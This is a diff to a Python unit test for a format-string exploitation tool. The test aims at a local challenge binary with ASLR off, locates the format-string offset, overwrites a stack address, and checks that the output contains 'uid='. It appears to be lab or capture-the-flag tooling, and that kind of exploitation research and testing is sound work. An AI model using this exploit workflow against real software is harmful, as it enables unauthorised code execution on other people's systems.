@@ -21,7 +21,8 @@ class TestBinaryNoneStackAlignment(unittest.TestCase):
             'binary': 'target/string_bug/ch14',
             'type_binary': 'ni',
             'type_input': 'arg',
-            'verbose': False
+            'verbose': False,
+            'ASLR': False
             })
         
         self.exploit = FormatStringExploit(self.dispatcher, verbose=False)
@@ -164,32 +165,16 @@ class TestBinaryNoneStackAlignment(unittest.TestCase):
         """
         Test to resolve the addresses in the stack.
         """
-        print("Resolution test to implement")
         self.exploit.setup_address_pattern(b"check at {ignore}\nargv[1] = [{ignore}]\nfmt=[{address}]\ncheck={ignore}\n")
         
         self.exploit.find_offset(max_offset=100, delay_between_request=0, connect_and_close=False, retry_on_error=True)
-        
-        self.exploit.classic_exploit(
-            address_overwrite=0xbffffa88,
+        response = self.exploit.classic_exploit(
+            address_overwrite=0xffffcec8,
             address_wanted=0xdeadbeef,
+            interactive=False,
         )
+        self.assertIn(b'uid=', response, "Response should contain 'uid='")
         
-
-    def ResolutionPrintStackAddresses(self):
-        """
-        Test to resolve the addresses in the stack and print them.
-        """
-        print("ResolutionPrintStackAddresses test to implement")
-        self.dispatcher = Dispatcher({
-            'mode': 'binary',
-            'binary': 'target/string_bug/ch14',
-            'type_binary': 'ni',
-            'type_input': 'arg',
-            'verbose': False
-            })
-        
-        self.exploit = FormatStringExploit(self.dispatcher, verbose=False)
-        self.exploit.setup_address_pattern(b"check at {ignore}\nargv[1] = [{ignore}]\nfmt=[{address}]\ncheck={ignore}\n")
 
 if __name__ == "__main__":
     unittest.main()
